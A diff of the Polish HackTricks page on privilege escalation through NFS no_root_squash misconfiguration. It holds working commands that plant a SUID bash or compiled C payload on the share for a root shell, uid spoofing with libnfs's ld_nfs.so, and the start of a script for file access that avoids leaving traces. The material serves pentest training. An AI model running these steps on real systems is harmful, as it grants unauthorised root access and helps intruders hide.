@@ -1,6 +1,8 @@
+# NFS No Root Squash Misconfiguration Privilege Escalation
+
 {{#include ../../banners/hacktricks-training.md}}
 
-# Podstawowe informacje o Squashingu
+## Squashing Basic Info
 
 NFS zazwyczaj (szczególnie w systemie Linux) ufa wskazanym `uid` i `gid` przez klienta łączącego się w celu uzyskania dostępu do plików (jeśli nie używa się Kerberosa). Istnieją jednak pewne konfiguracje, które można ustawić na serwerze, aby **zmienić to zachowanie**:
 
@@ -10,20 +12,20 @@ NFS zazwyczaj (szczególnie w systemie Linux) ufa wskazanym `uid` i `gid` przez 
 
 W pliku **/etc/exports**, jeśli znajdziesz jakiś katalog skonfigurowany jako **no_root_squash**, wtedy możesz **uzyskać dostęp** do niego **jako klient** i **zapisywać wewnątrz** tego katalogu **jakbyś był lokalnym** **rootem** maszyny.
 
-Aby uzyskać więcej informacji o **NFS**, sprawdź:
+Aby uzyskać więcej informacji na temat **NFS**, sprawdź:
 
 {{#ref}}
 ../../network-services-pentesting/nfs-service-pentesting.md
 {{#endref}}
 
-# Eskalacja uprawnień
+## Privilege Escalation
 
-## Zdalny exploit
+### Remote Exploit
 
 Opcja 1 używając bash:
-- **Zamontowanie tego katalogu** na maszynie klienckiej i **jako root skopiowanie** do zamontowanego folderu binarki **/bin/bash** oraz nadanie jej praw **SUID**, a następnie **wykonanie z maszyny ofiary** tej binarki bash.
-- Zauważ, że aby być rootem we współdzielonym zasobie NFS, **`no_root_squash`** musi być skonfigurowane na serwerze.
-- Jednak, jeśli nie jest włączone, możesz eskalować do innego użytkownika, kopiując binarkę do zasobu NFS i nadając jej uprawnienia SUID jako użytkownik, do którego chcesz się eskalować.
+- **Zamontowanie tego katalogu** na maszynie klienckiej i **jako root skopiowanie** do zamontowanego folderu binarnego **/bin/bash** i nadanie mu praw **SUID**, a następnie **wykonanie z maszyny ofiary** tego binarnego bash.
+- Zauważ, że aby być rootem wewnątrz udziału NFS, **`no_root_squash`** musi być skonfigurowane na serwerze.
+- Jednak jeśli nie jest włączone, możesz uzyskać dostęp do innego użytkownika, kopiując binarny plik do udziału NFS i nadając mu uprawnienia SUID jako użytkownik, do którego chcesz uzyskać dostęp.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -38,7 +40,7 @@ cd <SHAREDD_FOLDER>
 ```
 Opcja 2 z użyciem skompilowanego kodu C:
 - **Zamontowanie tego katalogu** na maszynie klienckiej, a następnie **jako root skopiowanie** do zamontowanego folderu naszego skompilowanego ładunku, który wykorzysta uprawnienia SUID, nadanie mu **praw SUID** i **wykonanie z maszyny ofiary** tego binarnego pliku (możesz znaleźć tutaj kilka [ładunków C SUID](payloads-to-execute.md#c)).
-- Te same ograniczenia co wcześniej.
+- Te same ograniczenia co wcześniej
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -52,19 +54,19 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-## Local Exploit
+### Local Exploit
 
-> [!NOTE]
+> [!TIP]
 > Zauważ, że jeśli możesz stworzyć **tunel z twojej maszyny do maszyny ofiary, nadal możesz użyć wersji zdalnej, aby wykorzystać tę eskalację uprawnień, tunelując wymagane porty**.\
 > Następujący trik dotyczy sytuacji, gdy plik `/etc/exports` **wskazuje na adres IP**. W takim przypadku **nie będziesz mógł użyć** w żadnym przypadku **eksploatu zdalnego** i będziesz musiał **nadużyć tego triku**.\
-> Innym wymaganym warunkiem, aby eksploatacja działała, jest to, że **eksport w `/etc/export`** **musi używać flagi `insecure`**.\
+> Innym wymaganiem, aby eksploatacja działała, jest to, że **eksport w `/etc/export`** **musi używać flagi `insecure`**.\
 > --_Nie jestem pewien, czy jeśli `/etc/export` wskazuje na adres IP, ten trik zadziała_--
 
-## Basic Information
+### Basic Information
 
-Scenariusz polega na wykorzystaniu zamontowanego udziału NFS na lokalnej maszynie, wykorzystując lukę w specyfikacji NFSv3, która pozwala klientowi określić swój uid/gid, co potencjalnie umożliwia nieautoryzowany dostęp. Eksploatacja polega na użyciu [libnfs](https://github.com/sahlberg/libnfs), biblioteki, która umożliwia fałszowanie wywołań RPC NFS.
+Scenariusz polega na wykorzystaniu zamontowanego udziału NFS na lokalnej maszynie, wykorzystując błąd w specyfikacji NFSv3, który pozwala klientowi określić swój uid/gid, potencjalnie umożliwiając nieautoryzowany dostęp. Eksploatacja polega na użyciu [libnfs](https://github.com/sahlberg/libnfs), biblioteki, która umożliwia fałszowanie wywołań RPC NFS.
 
-### Compiling the Library
+#### Compiling the Library
 
 Kroki kompilacji biblioteki mogą wymagać dostosowań w zależności od wersji jądra. W tym konkretnym przypadku wywołania syscalls fallocate zostały zakomentowane. Proces kompilacji obejmuje następujące polecenia:
 ```bash
@@ -73,9 +75,9 @@ Kroki kompilacji biblioteki mogą wymagać dostosowań w zależności od wersji 
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
-### Przeprowadzanie Eksploitu
+#### Przeprowadzanie Eksploitu
 
-Eksploit polega na stworzeniu prostego programu C (`pwn.c`), który podnosi uprawnienia do roota, a następnie uruchamia powłokę. Program jest kompilowany, a wynikowy plik binarny (`a.out`) jest umieszczany na udostępnieniu z suid root, używając `ld_nfs.so` do fałszowania uid w wywołaniach RPC:
+Eksploit polega na stworzeniu prostego programu C (`pwn.c`), który podnosi uprawnienia do roota, a następnie uruchamia powłokę. Program jest kompilowany, a powstały plik binarny (`a.out`) jest umieszczany na udostępnieniu z suid root, używając `ld_nfs.so` do fałszowania uid w wywołaniach RPC:
 
 1. **Skompiluj kod eksploitu:**
 ```bash
@@ -95,9 +97,9 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs:/
 /mnt/share/a.out
 #root
 ```
-## Bonus: NFShell do dyskretnego dostępu do plików
+### Bonus: NFShell do dyskretnego dostępu do plików
 
-Gdy uzyskano dostęp do roota, aby interagować z udostępnionym zasobem NFS bez zmiany właściciela (aby uniknąć pozostawiania śladów), używany jest skrypt Pythona (nfsh.py). Skrypt ten dostosowuje uid, aby odpowiadał uid pliku, do którego uzyskuje się dostęp, co pozwala na interakcję z plikami na udostępnionym zasobie bez problemów z uprawnieniami:
+Gdy uzyskano dostęp do roota, aby interagować z udostępnionym zasobem NFS bez zmiany właściciela (aby uniknąć pozostawiania śladów), używany jest skrypt Pythona (nfsh.py). Skrypt ten dostosowuje uid, aby odpowiadał uid pliku, do którego uzyskuje się dostęp, co pozwala na interakcję z plikami na udostępnieniu bez problemów z uprawnieniami:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
